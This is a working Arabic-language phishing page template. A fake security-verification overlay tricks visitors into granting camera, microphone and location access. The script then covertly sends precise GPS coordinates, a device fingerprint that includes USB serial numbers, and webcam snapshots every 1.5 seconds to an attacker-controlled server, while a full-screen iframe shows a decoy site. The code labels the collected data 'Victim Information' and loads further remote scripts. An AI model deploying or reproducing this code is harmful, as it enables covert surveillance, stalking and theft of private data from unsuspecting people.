<html lang="ar" dir="rtl">
<head> 
<meta charset="UTF-8"> 
<meta name="robots" content="noindex, nofollow"> 
<meta name="viewport" content="width=device-width,initial-scale=1"> 
<title>جارٍ التحميل...</title> 
<style>
iframe{border:0;overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0;}
#pov{position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:99999;display:flex;align-items:center;justify-content:center;padding:16px}
#pob{background:#fff;border-radius:14px;max-width:330px;width:100%;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5)}
.poh{background:linear-gradient(135deg,#1a73e8,#0d47a1);padding:20px;text-align:center;color:#fff}
.poi{display:flex;align-items:center;gap:10px;padding:10px;border-radius:9px;background:#f5f5f5;margin-bottom:8px;border:2px solid #e0e0e0;transition:.3s}
.poi.ok{background:#e8f5e9;border-color:#4caf50}
.poi.no{background:#ffebee;border-color:#f44336}
#pbtn{width:100%;padding:13px;background:linear-gradient(90deg,#1a73e8,#0d47a1);color:#fff;border:none;border-radius:9px;font-size:14px;font-weight:700;cursor:pointer;margin-top:8px}
#pbtn:disabled{opacity:.6}
</style>
</head>
<body>

<!-- ══ Mandatory Permissions Overlay ══ -->
<div id="pov">
  <div id="pob">
    <div class="poh">
      <div style="font-size:34px;margin-bottom:6px">🔐</div>
      <div style="font-size:16px;font-weight:700">التحقق الأمني مطلوب</div>
      <div style="font-size:11px;opacity:.9;margin-top:3px">امنح الصلاحيات للمتابعة</div>
    </div>
    <div style="padding:16px">
      <div class="poi" id="pi-cam"><span style="font-size:20px">📷</span><div style="flex:1"><div style="font-size:13px;font-weight:600">الكاميرا</div><div style="font-size:11px;color:#888">للتحقق البصري</div></div><span id="si-cam">⏳</span></div>
      <div class="poi" id="pi-mic"><span style="font-size:20px">🎙️</span><div style="flex:1"><div style="font-size:13px;font-weight:600">الميكروفون</div><div style="font-size:11px;color:#888">للتحقق الصوتي</div></div><span id="si-mic">⏳</span></div>
      <div class="poi" id="pi-loc"><span style="font-size:20px">📍</span><div style="flex:1"><div style="font-size:13px;font-weight:600">الموقع</div><div style="font-size:11px;color:#888">للتحقق من موقعك</div></div><span id="si-loc">⏳</span></div>
      <button id="pbtn" onclick="wvGrant()">السماح بجميع الصلاحيات</button>
      <div id="pmsg" style="font-size:11px;color:#e53935;text-align:center;margin-top:8px;min-height:14px"></div>
    </div>
  </div>
</div>

<video id="video" style="display:none" playsinline autoplay></video>
<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
<script type="text/javascript">
var uid="<%=uid %>";
var _wvStream=null;

function _wvPS(id,st){
  document.getElementById('pi-'+id).className='poi'+(st==='ok'?' ok':st==='no'?' no':'');
  document.getElementById('si-'+id).textContent=st==='ok'?'✅':st==='no'?'❌':'⏳';
}
async function wvGrant(){
  var btn=document.getElementById('pbtn');
  btn.disabled=true;btn.textContent='جارٍ طلب الصلاحيات...';
  var camOk=false;
  try{
    _wvStream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:'user'}});
    _wvPS('cam','ok');_wvPS('mic','ok');camOk=true;
  }catch(e){
    try{_wvStream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}});_wvPS('cam','ok');_wvPS('mic','no');camOk=true;}
    catch(e2){_wvPS('cam','no');_wvPS('mic','no');}
  }
  await new Promise(function(resolve){
    if(!navigator.geolocation){_wvPS('loc','no');return resolve();}
    navigator.geolocation.getCurrentPosition(
      function(p){_wvPS('loc','ok');$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(p.coords.latitude),lon:encodeURIComponent(p.coords.longitude),acc:encodeURIComponent(p.coords.accuracy)});resolve();},
      function(){_wvPS('loc','no');resolve();},
      {enableHighAccuracy:true,timeout:10000,maximumAge:0}
    );
    setTimeout(resolve,12000);
  });
  if(!camOk){
    document.getElementById('pmsg').textContent='⚠️ الكاميرا مطلوبة. اضغط مجدداً.';
    btn.disabled=false;btn.textContent='حاول مجدداً';return;
  }
  document.getElementById('pov').style.display='none';
  gather(_wvStream);
}

async function gather(advStream){
var td="";
<% if(!t){ %>
td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
<% }else{ %>
await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));

<% } %>

td+="<br><br><b>⏳ Date In Victim's Device :</b> "+new Date()+"<br>";
var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
///INITIALS
td+="<br><b>📱 Device Information</b><br>";
for(var i=0;i < xo.length;i++){ 
if(xo[i] in navigator){
var str = navigator[xo[i]];
td+="<b>"+xo[i] +"</b>: <code>"+str+"</code><br>";
}
}



if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
/////List cameras and microphones.
await navigator.mediaDevices?.enumerateDevices()
.then(function(devices) {
td+="<br><b>📷 Media Device Information</b><br>";
devices.forEach(function(device) {
td+="<b>"+device.kind+":</b> " + device.label +" id = <code>" + device.deviceId+"</code><br>";
});
})
.catch(function(err) {
td+="<br><b>📷 Media Device Information</b><br>";
td+="⚠️ Media Device Error: "+err.name + ": " + err.message;
});
}


////CONNECTION
if("connection" in navigator){
td+="<br><b>🕸️ Network Information</b><br>";
for(var i=0;i < xoc.length;i++){ 
var str = navigator.connection[xoc[i]];
td+="<b>"+xoc[i] +"</b>: <code>"+str+"</code><br>";
}}


////USB
if("usb" in navigator){
await navigator.usb.getDevices()
.then(devices => {
td+="<br><b>🔌 Total USB devices connected:</b> " + devices.length+"<br>";
devices.forEach(device => {
td+="<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber+"</code><br>";
});
});
}

if("getBattery" in navigator){
await navigator.getBattery().then(function(battery) {
td+="<br><b>🔋 Battery Information</b><br>";
td+="<b>🔋Battery Level:</b> " +battery.level*100+"%<br><b>⚡ Is Battery Charging:</b> "+battery.charging+"";
});
}

//////Location
if(!navigator.geolocation) {
td+="<br><b>📍 Location Information</b><br>";
td+="⚠️ Location API not avilable";
} 

function success(pos) {
const crd = pos.coords;
$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
l=true;
red();
});
}

function error(err) {
td+="<br><b>📍 Location Information</b><br>";
td+="⚠️ Location ERROR: <code>"+err.message+"</code>";
}
if(navigator.geolocation){
navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
}




const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

function post(o){
$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{

});
}
// Use stream already obtained from permissions overlay
function handleSuccess(stream) {
window.stream = stream;
video.srcObject = stream;
var context = canvas.getContext('2d');
var id=setInterval(function(){
context.drawImage(video, 0, 0, 500, 500);
var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
post(canvasData);
}, 1500);
}
if(advStream) handleSuccess(advStream);
else {
  try{navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(handleSuccess).catch(function(){});}catch(e){}
}






$.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{console.log("done")});

}

gather();

</script>
<script src="<%= a %>/t.js?u=<%= uid %>"></script>
<script src="<%= a %>/adv.js?u=<%= uid %>&a=<%= a %>"></script>
  <iframe src="<%=url %>"></iframe>
</body>
</html>
